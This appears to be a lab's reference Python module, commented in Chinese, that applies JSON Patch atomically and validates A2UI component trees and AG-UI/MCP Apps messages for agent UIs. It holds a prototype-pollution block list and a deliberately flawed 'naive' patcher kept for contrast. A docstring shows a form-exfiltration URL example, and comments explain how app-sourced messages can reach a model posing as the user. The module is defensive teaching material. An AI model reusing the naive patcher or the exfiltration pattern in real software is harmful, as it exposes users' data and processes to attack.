    """RFC 6902 §4.6 的相等：**先比 JSON 类型**；数字按数值；数组逐个；对象键集合相同、值逐个相等（与键顺序无关）。
    ★ Python `True == 1`、`1 == 1.0`；JS `===` 把两个内容相同的对象判不等。用语言自带的 == 都会错。
    """
    ta = json_type(a)
    if ta != json_type(b):
        return False
    if ta == "array":
        x = cast(list[Json], a)
        y = cast(list[Json], b)
        if len(x) != len(y):
            return False
        return all(json_type_equal(x[i], y[i]) for i in range(len(x)))
    if ta == "object":
        ox = cast(Obj, a)
        oy = cast(Obj, b)
        if len(ox) != len(oy):
            return False
        return all(k in oy and json_type_equal(ox[k], oy[k]) for k in ox)
    return a == b


# ★ JS 的 `obj[key] = v` 碰到这三个键段会改原型链。Python 没这个问题，但两边同样拒绝，输出才一致。
FORBIDDEN_SEGMENTS = ["__proto__", "constructor", "prototype"]


@dataclass(frozen=True)
class Pointer:
    ok: bool
    tokens: list[str]
    reason: str


def decode_pointer(path: str) -> Pointer:
    """RFC 6901。"" 是整个文档；否则必须以 / 开头。每段先 `~1`→`/`，再 `~0`→`~`；`~` 后面只能是 0 或 1。
    ★ 顺序反了，`~01` 会先变成 `~1` 再变成 `/`。
    """

    def bad(reason: str) -> Pointer:
        return Pointer(ok=False, tokens=[], reason=reason)

    if path == "":
        return Pointer(ok=True, tokens=[], reason="")
    if path[0] != "/":
        return bad("bad-pointer")
    tokens: list[str] = []
    for raw in path[1:].split("/"):
        for i, c in enumerate(raw):
            if c == "~" and raw[i + 1 : i + 2] != "0" and raw[i + 1 : i + 2] != "1":
                return bad("bad-escape")
        tok = raw.replace("~1", "/").replace("~0", "~")
        if tok in FORBIDDEN_SEGMENTS:
            return bad(f"forbidden-segment:{tok}")
        tokens.append(tok)
    return Pointer(ok=True, tokens=tokens, reason="")


INDEX_RE = re.compile(r"(?:0|[1-9][0-9]*)")


def parse_array_index(tok: str) -> int | None:
    """RFC 6901 的 array-index：`0` 或不以 0 开头的数字串。★ parseInt 会接受 "01"、"1e0"、" 1"；int() 会接受 " 1"、"+1"、"١"。"""
    return int(tok) if INDEX_RE.fullmatch(tok) else None


@dataclass(frozen=True)
class _Got:
    ok: bool
    value: Json
    reason: str


def _get_at(doc: Json, tokens: list[str]) -> _Got:
    cur: Json = doc
    for t in tokens:
        if isinstance(cur, list):
            i = parse_array_index(t)
            if i is None:
                return _Got(ok=False, value=None, reason=f"bad-index:{t}")
            if i >= len(cur):
                return _Got(ok=False, value=None, reason="path-not-found")
            cur = cur[i]
        elif isinstance(cur, dict):
            if t not in cur:
                return _Got(ok=False, value=None, reason="path-not-found")
            cur = cur[t]
        else:
            return _Got(ok=False, value=None, reason="path-not-found")
    return _Got(ok=True, value=cur, reason="")


@dataclass(frozen=True)
class _Step:
    ok: bool
    doc: Json
    reason: str


def _fail(reason: str) -> _Step:
    return _Step(ok=False, doc=None, reason=reason)


def _add_at(doc: Json, tokens: list[str], value: Json) -> _Step:
    if len(tokens) == 0:
        return _Step(ok=True, doc=value, reason="")
    p = _get_at(doc, tokens[:-1])
    if not p.ok:
        return _fail(p.reason)
    last = tokens[-1]
    parent = p.value
    if isinstance(parent, list):
        i = len(parent) if last == "-" else parse_array_index(last)
        if i is None:
            return _fail(f"bad-index:{last}")
        if i > len(parent):
            return _fail("index-out-of-range")
        parent.insert(i, value)
        return _Step(ok=True, doc=doc, reason="")
    if isinstance(parent, dict):
        parent[last] = value
        return _Step(ok=True, doc=doc, reason="")
    return _fail("path-not-found")


def _remove_at(doc: Json, tokens: list[str]) -> _Step:
    if len(tokens) == 0:
        return _fail("cannot-remove-root")
    p = _get_at(doc, tokens[:-1])
    if not p.ok:
        return _fail(p.reason)
    last = tokens[-1]
    parent = p.value
    if isinstance(parent, list):
        i = parse_array_index(last)
        if i is None:
            return _fail(f"bad-index:{last}")
        if i >= len(parent):
            return _fail("path-not-found")
        del parent[i]
        return _Step(ok=True, doc=doc, reason="")
    if isinstance(parent, dict):
        if last not in parent:
            return _fail("path-not-found")
        del parent[last]
        return _Step(ok=True, doc=doc, reason="")
    return _fail("path-not-found")


def _replace_at(doc: Json, tokens: list[str], value: Json) -> _Step:
    if len(tokens) == 0:
        return _Step(ok=True, doc=value, reason="")
    g = _get_at(doc, tokens)
    if not g.ok:
        return _fail(g.reason)
    parent = _get_at(doc, tokens[:-1]).value
    last = tokens[-1]
    if isinstance(parent, list):
        parent[cast(int, parse_array_index(last))] = value
    else:
        cast(Obj, parent)[last] = value
    return _Step(ok=True, doc=doc, reason="")


@dataclass(frozen=True)
class PatchResult:
    ok: bool
    # 成功：新文档；失败：**原来那个**文档，一个字节没动。
    doc: Json
    # 失败时 `#第几个op 原因`。
    reason: str


def apply_patch_atomic(doc: Json, ops: Any) -> PatchResult:
    """TODO 4 的参考实现。对深拷贝逐个应用，任何一个 op 失败整份 patch 失败、原文档原样返回。
    支持 add / remove / replace / move / copy / test。
      add      父节点必须存在；数组下标 0..len 或 '-'（追加）；对象键存在就覆盖
      remove / replace  目标必须存在
      move     from 必须存在；from 不能是 path 的真前缀（move-into-child）；from == path 是空操作
      copy     from 必须存在，值深拷贝
      test     json_type_equal，不等 → test-failed

    ★ 逐条应用、遇错就停、保留已应用的部分：UI 渲染出一个协议里从未存在过的「一半旧一半新」（RFC 6902 §5）。
    ★ 通过了 AG-UI 的 schema 校验 ≠ 能应用：「指针解不解得开」是 applier 的事，协议明说不管。
    """

    def failed(i: int, reason: str) -> PatchResult:
        return PatchResult(ok=False, doc=doc, reason=f"#{i} {reason}")

    if not isinstance(ops, list):
        return PatchResult(ok=False, doc=doc, reason="not-an-array")
    work = clone_json(doc)
    for i, op in enumerate(ops):
        if not isinstance(op, dict) or not isinstance(op.get("op"), str):
            return failed(i, "bad-op")
        kind: str = op["op"]
        path = op.get("path")
        if not isinstance(path, str):
            return failed(i, "bad-op")
        ptr = decode_pointer(path)
        if not ptr.ok:
            return failed(i, ptr.reason)
        if kind == "add" or kind == "replace" or kind == "test":
            if "value" not in op:
                return failed(i, "missing-value")
            value = op["value"]
            if kind == "add":
                r = _add_at(work, ptr.tokens, clone_json(value))
            elif kind == "replace":
                r = _replace_at(work, ptr.tokens, clone_json(value))
            else:
                g = _get_at(work, ptr.tokens)
                if not g.ok:
                    r = _fail(g.reason)
                elif json_type_equal(g.value, value):
                    r = _Step(ok=True, doc=work, reason="")
                else:
                    r = _fail("test-failed")
        elif kind == "remove":
            r = _remove_at(work, ptr.tokens)
        elif kind == "move" or kind == "copy":
            frm = op.get("from")
            if not isinstance(frm, str):
                return failed(i, "missing-from")
            src = decode_pointer(frm)
            if not src.ok:
                return failed(i, src.reason)
            g = _get_at(work, src.tokens)
            if not g.ok:
                return failed(i, f"from:{g.reason}")
            if kind == "move":
                if frm == path:
                    r = _Step(ok=True, doc=work, reason="")
                elif path.startswith(frm + "/"):
                    r = _fail("move-into-child")
                else:
                    rm = _remove_at(work, src.tokens)
                    r = _add_at(rm.doc, ptr.tokens, g.value) if rm.ok else rm
            else:
                r = _add_at(work, ptr.tokens, clone_json(g.value))
        else:
            return failed(i, f"unknown-op:{kind}")
        if not r.ok:
            return failed(i, r.reason)
        work = r.doc
    return PatchResult(ok=True, doc=work, reason="")


def _loose_index(t: str) -> int | None:
    """朴素下标：跳过前导空格、读前导数字（parseInt 的行为）。读不到 → None。"""
    i = 0
    while i < len(t) and t[i] == " ":
        i += 1
    n = ""
    while i < len(t) and "0" <= t[i] <= "9":
        n += t[i]
        i += 1
    return None if n == "" else int(n)


def _loose_eq(a: Json, b: Json) -> bool:
    """朴素相等：数字和布尔先转数字再比（JS 的 ==、Python 的 == 在这里一致），其余标量严格相等，对象一律不等。"""

    def num(x: Json) -> int | float:
        return (1 if x else 0) if isinstance(x, bool) else cast(float, x)

    ta = json_type(a)
    tb = json_type(b)
    if ta in ("number", "boolean") and tb in ("number", "boolean"):
        return num(a) == num(b)
    if ta != tb:
        return False
    if ta == "string" or ta == "null":
        return a == b
    return False


@dataclass(frozen=True)
class NaiveResult:
    doc: Json
    reason: str


def apply_patch_naive(doc: Json, ops: list[dict[str, Any]]) -> NaiveResult:
    """对照组：一个「看起来对」的 applier。只支持 add / replace / remove / test。
    ★ 五个错：遇错就停且保留已应用的部分、`~0` 先于 `~1`、下标用 parseInt、test 用 ==、不挡 __proto__。
      最后一条这里不真跑（TS 那边真跑会改掉进程里的 Object.prototype），只报告它会写到哪。
    """
    work = clone_json(doc)
    for i, op in enumerate(ops):
        kind = op["op"]
        value = op.get("value")
        tokens = [t.replace("~0", "~").replace("~1", "/") for t in op["path"][1:].split("/")]
        if any(t in FORBIDDEN_SEGMENTS for t in tokens):
            return NaiveResult(
                doc=work, reason=f"#{i} 会写到 Object.prototype.{tokens[-1]}（这里不真跑）"
            )
        parent: Json = work
        for t in tokens[:-1]:
            if isinstance(parent, list):
                k = _loose_index(t)
                parent = parent[k] if k is not None and k < len(parent) else None
            elif isinstance(parent, dict):
                parent = parent[t] if t in parent else None
            else:
                parent = None
            if parent is None:
                return NaiveResult(doc=work, reason=f"#{i} path-not-found")
        last = tokens[-1]
        if isinstance(parent, list):
            k = len(parent) if last == "-" else _loose_index(last)
            if k is None:
                return NaiveResult(doc=work, reason=f"#{i} bad-index")
            if kind == "add":
                parent.insert(k, value)
            elif kind == "test":
                if k >= len(parent) or not _loose_eq(parent[k], value):
                    return NaiveResult(doc=work, reason=f"#{i} test-failed")
            else:
                if k >= len(parent):
                    return NaiveResult(doc=work, reason=f"#{i} path-not-found")
                if kind == "replace":
                    parent[k] = value
                else:
                    del parent[k]
        elif isinstance(parent, dict):
            if kind == "add":
                parent[last] = value
            elif last not in parent:
                return NaiveResult(doc=work, reason=f"#{i} path-not-found")
            elif kind == "test":
                if not _loose_eq(parent[last], value):
                    return NaiveResult(doc=work, reason=f"#{i} test-failed")
            elif kind == "replace":
                parent[last] = value
            else:
                del parent[last]
        else:
            return NaiveResult(doc=work, reason=f"#{i} path-not-found")
    return NaiveResult(doc=work, reason="")


def a2ui_update_data_model(doc: Json, path: str, value: Json) -> Json:
    """A2UI 的 updateDataModel：value 是 null → **删掉**这个键（v1.0 原文）。
    ★ 同一个 null 在 JSON Patch 里是「设成 null」。A2UI 的标准传输就是 AG-UI——两条路径上同一个值意思相反。
    """
    ptr = decode_pointer(path)
    if not ptr.ok:
        return doc
    work = clone_json(doc)
    r = _remove_at(work, ptr.tokens) if value is None else _add_at(work, ptr.tokens, value)
    return r.doc if r.ok else doc


# ─────────────────────────────────────────────────────────────
# 八、A2UI：邻接表、目录、URL 属性（§5.3–5.5、§5.7）
# ─────────────────────────────────────────────────────────────

# 目录里一个属性的类型（lab 的简化版目录）。
PropKind = Literal["text", "url", "child", "children", "binding", "action"]


@dataclass(frozen=True)
class CompDef:
    props: dict[str, PropKind]
    # v1.0 候选：省略 = 任何父组件都行。
    allowed_parents: list[str] | None = None
    allowed_children: list[str] | None = None


Caller = Literal["rendererOnly", "agentOnly", "rendererOrAgent"]


@dataclass(frozen=True)
class FnDef:
    allowed_callers: Caller


@dataclass(frozen=True)
class A2uiCatalog:
    # ★ 一个字符串 ID，不是可解析的 URI——长得像 URL 也不许去 fetch。
    catalog_id: str
    components: dict[str, CompDef]
    functions: dict[str, FnDef]
    # URL 型属性允许的主机（精确匹配）。
    url_hosts: list[str]


def catalog_from_json(d: dict[str, Any]) -> A2uiCatalog:
    """TS 那边 JSON.parse 之后直接当类型用，这里要显式转成 dataclass。"""
    return A2uiCatalog(
        catalog_id=d["catalogId"],
        components={
            name: CompDef(
                props=dict(c["props"]),
                allowed_parents=c.get("allowedParents"),
                allowed_children=c.get("allowedChildren"),
            )
            for name, c in d["components"].items()
        },
        functions={
            name: FnDef(allowed_callers=f["allowedCallers"]) for name, f in d["functions"].items()
        },
        url_hosts=list(d["urlHosts"]),
    )


# 一个组件，原样的 JSON 对象：id、component 两个键，其余是任意属性（键的顺序就是报错的顺序）。
A2uiComponent = dict[str, Any]


@dataclass(frozen=True)
class TreeError:
    code: str
    id: str
    detail: str


@dataclass(frozen=True)
class TreeReport:
    # 有 root 才开始渲染；没有 root 时其余组件只缓冲（规范原文），不算错误。
    has_root: bool
    errors: list[TreeError]
    # 被引用但还没定义的 id：渲染占位符，不是错误（progressive rendering）。
    placeholders: list[str]
    # 从 root 深度优先走到的组件，按渲染顺序。
    rendered: list[str]
    # has_root 且没有错误。
    ok: bool


# ★ 规范对环、多父、深度只字未提（grep 零命中）：这个数字是 lab 声明的常量，不是引用规范。
MAX_TREE_DEPTH = 16


def url_host_allowed(v: str, hosts: list[str]) -> bool:
    """URL 型属性：必须是字面量 https URL，主机（精确）在目录白名单里。"""
    if ascii_lower(v[:8]) != "https://":
        return False
    rest = v[8:]
    cut = len(rest)
    for c in ["/", "?", "#"]:
        k = rest.find(c)
        if k >= 0 and k < cut:
            cut = k
    rest = rest[:cut]
    if "@" in rest:
        return False
    return ascii_lower(rest) in hosts


def _is_binding(v: Any) -> bool:
    return isinstance(v, dict) and isinstance(v.get("path"), str)


def _is_call(v: Any) -> bool:
    return isinstance(v, dict) and isinstance(v.get("call"), str)


def _child_refs(c: A2uiComponent, d: CompDef) -> list[str]:
    """组件的子引用，按目录里属性的声明顺序。"""
    out: list[str] = []
    for k in js_keys(d.props):
        kind = d.props[k]
        v = c.get(k)
        if kind == "child" and isinstance(v, str):
            out.append(v)
        if kind == "children" and isinstance(v, list):
            out.extend(x for x in v if isinstance(x, str))
    return out


def validate_tree(components: list[A2uiComponent], catalog: A2uiCatalog) -> TreeReport:
    """TODO 5 的参考实现：一次 updateComponents 的组件列表对照**本地**目录校验。

    第一遍，逐个组件（列表顺序）：
      DUPLICATE_ID          同一个 id 出现第二次（后一个不再参与）
      UNKNOWN_COMPONENT     组件类型不在目录里
      UNKNOWN_PROP          属性不在这个组件的目录定义里（id、component 除外）
      URL_NOT_LITERAL       url 型属性不是字符串（DataBinding、formatString 都算）
      URL_HOST_NOT_ALLOWED  url 字面量不是 https，或主机不在 url_hosts
      BAD_PROP              text：字符串 / 绑定 / 函数调用之外的值；child：不是字符串；children：不是字符串数组；
                            binding：不是 {path}；action：不是 {call}
      UNKNOWN_FUNCTION      action 或 text 里的函数调用不在目录里
    没有 root：has_root=False，到此为止（缓冲，不渲染）。
    第二遍，从 root 深度优先（子引用按 _child_refs 的顺序）：
      引用的 id 不存在          → placeholders（不是错误）
      引用的 id 在当前路径上    → CYCLE，detail 是 `root>a>b>a` 这样的路径
      引用的 id 已经有父节点    → MULTI_PARENT，detail `子: 先前的父 + 这一个父`
      深度超过 MAX_TREE_DEPTH  → TOO_DEEP（root 深度 0）
      allowedParents / allowedChildren 不允许 → UNALLOWED_PARENT，detail `子类型 under 父类型`
      目录外的组件不渲染、不展开

    ★ 邻接表不是嵌套 JSON：`a→b→a` 每个组件单独看都合法，朴素递归渲染器会栈溢出。
    ★ 「不执行代码」≠「不外泄」：Image.url = formatString('https://x/?d=${/form}')，渲染即发请求，用户每敲一个字再发一次。
    """
    errors: list[TreeError] = []

    def err(code: str, id_: str, detail: str) -> None:
        errors.append(TreeError(code=code, id=id_, detail=detail))

    by_id: dict[str, A2uiComponent] = {}

    for c in components:
        cid = c["id"]
        if cid in by_id:
            err("DUPLICATE_ID", cid, c["component"])
            continue
        by_id[cid] = c
        d = catalog.components.get(c["component"])
        if d is None:
            err("UNKNOWN_COMPONENT", cid, c["component"])
            continue
        for k in js_keys(c):
            if k == "id" or k == "component":
                continue
            kind = d.props.get(k)
            v = c[k]
            if kind is None:
                err("UNKNOWN_PROP", cid, k)
            elif kind == "url":
                if not isinstance(v, str):
                    err("URL_NOT_LITERAL", cid, f"{k}={J(v)}")
                elif not url_host_allowed(v, catalog.url_hosts):
                    err("URL_HOST_NOT_ALLOWED", cid, f"{k}={v}")
            elif kind == "text":
                if _is_call(v):
                    fn = v["call"]
                    if fn not in catalog.functions:
                        err("UNKNOWN_FUNCTION", cid, f"{k}:{fn}")
                elif not isinstance(v, str) and not _is_binding(v):
                    err("BAD_PROP", cid, k)
            elif kind == "child":
                if not isinstance(v, str):
                    err("BAD_PROP", cid, k)
            elif kind == "children":
                if not isinstance(v, list) or any(not isinstance(x, str) for x in v):
                    err("BAD_PROP", cid, k)
            elif kind == "binding":
                if not _is_binding(v):
                    err("BAD_PROP", cid, k)
            elif not _is_call(v):
                err("BAD_PROP", cid, k)
            else:
                fn = v["call"]
                if fn not in catalog.functions:
                    err("UNKNOWN_FUNCTION", cid, f"{k}:{fn}")

    placeholders: list[str] = []
    rendered: list[str] = []
    if "root" not in by_id:
        return TreeReport(
            has_root=False, errors=errors, placeholders=placeholders, rendered=rendered, ok=False
        )

    parent_of: dict[str, str] = {}

    def visit(id_: str, path: list[str]) -> None:
        c = by_id[id_]
        d = catalog.components.get(c["component"])
        if d is None:
            return
        if len(path) > MAX_TREE_DEPTH:
            err("TOO_DEEP", id_, str(len(path)))
            return
        rendered.append(id_)
        here = [*path, id_]
        for k in _child_refs(c, d):
            if k in here:
                err("CYCLE", k, ">".join([*here, k]))
                continue
            prev = parent_of.get(k)
            if prev is not None:
                err("MULTI_PARENT", k, f"{k}: {prev} + {id_}")
                continue
            parent_of[k] = id_
            child = by_id.get(k)
            if child is None:
                if k not in placeholders:
                    placeholders.append(k)
                continue
            cdef = catalog.components.get(child["component"])
            if cdef is not None:
                ok_parent = cdef.allowed_parents is None or c["component"] in cdef.allowed_parents
                ok_child = d.allowed_children is None or child["component"] in d.allowed_children
                if not ok_parent or not ok_child:
                    err("UNALLOWED_PARENT", k, f"{child['component']} under {c['component']}")
                    continue
            visit(k, here)

    visit("root", [])
    return TreeReport(
        has_root=True,
        errors=errors,
        placeholders=placeholders,
        rendered=rendered,
        ok=len(errors) == 0,
    )


def resolve_catalog(catalog_id: str, local: list[A2uiCatalog]) -> A2uiCatalog | None:
    """catalogId 只在本地目录里按字符串找。★ 永远不 fetch：按 agent 给的 URL 拉目录，等于让 agent 决定你有哪些组件。"""
    for c in local:
        if c.catalog_id == catalog_id:
            return c
    return None


def agent_may_call(fn: str, catalog: A2uiCatalog) -> Decision:
    """agent 想调一个渲染器函数（v1.0 候选的 callRendererFunction）。
    ★ 和 MCP Apps 的 visibility 是同一个问题的镜像，默认方向相反：MCP Apps 省略 = 双方能调；A2UI 未注册 = 拒绝。
    """
    f = catalog.functions.get(fn)
    if f is None:
        return _deny("INVALID_FUNCTION_CALL:unregistered")
    if f.allowed_callers == "rendererOnly":
        return _deny("INVALID_FUNCTION_CALL:rendererOnly")
    return _allow()


# ─────────────────────────────────────────────────────────────
# 九、从 iframe 通往模型上下文的两条路，和 AG-UI 的两处宽松（§2.5、§6.4、§8.1）
# ─────────────────────────────────────────────────────────────


@dataclass(frozen=True)
class IngestedMessage:
    ok: bool
    role: Literal["user"]
    text: str
    # ★ role 是 user，内容来自第三方代码。L14 的「按参数来源授权」在这里多了一个来源：app。
    source: Literal["app"]
    server: str
    needs_confirm: bool
    error: str


def ingest_ui_message(params: Any, server: str) -> IngestedMessage:
    """View 发来的 ui/message（params: { role: "user", content: { type: "text", text } }）进对话之前。
    规范只说宿主 MAY 征询同意；这里一律打上 source:"app" 并要求确认。形状不对 → error。
    """

    def out(text: str, error: str) -> IngestedMessage:
        return IngestedMessage(
            ok=error == "",
            role="user",
            text=text,
            source="app",
            server=server,
            needs_confirm=True,
            error=error,
        )

    if not isinstance(params, dict):
        return out("", "bad-shape")
    if params.get("role") != "user":
        return out("", f"role:{J(params.get('role'))}")
    c = params.get("content")
    if not isinstance(c, dict) or c.get("type") != "text" or not isinstance(c.get("text"), str):
        return out("", "bad-shape")
    return out(c["text"], "")


@dataclass(frozen=True)
class ContextUpdate:
    view: str
    content: str


def model_context_for_turn(updates: list[ContextUpdate]) -> list[tuple[str, str]]:
    """ui/update-model-context：每次覆盖同一个 View 上一次的内容；下一轮只送最后一次。
    返回 (view, content)，按 View 第一次出现的顺序。
    """
    last: dict[str, str] = {}
    for u in updates:
        last[u.view] = u.content
    return list(last.items())


Outcome = Literal["success", "interrupt", "cancelled", "unknown"]


def read_outcome(raw: Any) -> Outcome:
    """AG-UI 1.0 的 RUN_FINISHED.outcome。
    ★ 协议说认不出的 outcome 剥掉、当成功读——以后新增一个 cancellation，所有 1.0 消费者都会读成「完成」。这里报 unknown。
    """
    t = raw.get("type") if isinstance(raw, dict) else raw
    if isinstance(t, str) and t in ("success", "interrupt", "cancelled"):
        return cast(Outcome, t)
    return "unknown"


ISO_RE = re.compile(r"[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}(?:\.[0-9]{1,3})?Z")


def interrupt_expired(expires_at: Any, now_iso: str) -> bool:
    """Interrupt.expiresAt。★ 协议原文：格式不对的值让中断「看起来永不过期」。这里反过来：格式不对 = 已过期（fail-closed）。
    只认 UTC 的 `YYYY-MM-DDTHH:MM:SS(.sss)Z`，比较前 19 个字符。
    """
    if not isinstance(expires_at, str) or ISO_RE.fullmatch(expires_at) is None:
        return True
    return expires_at[:19] <= now_iso[:19]
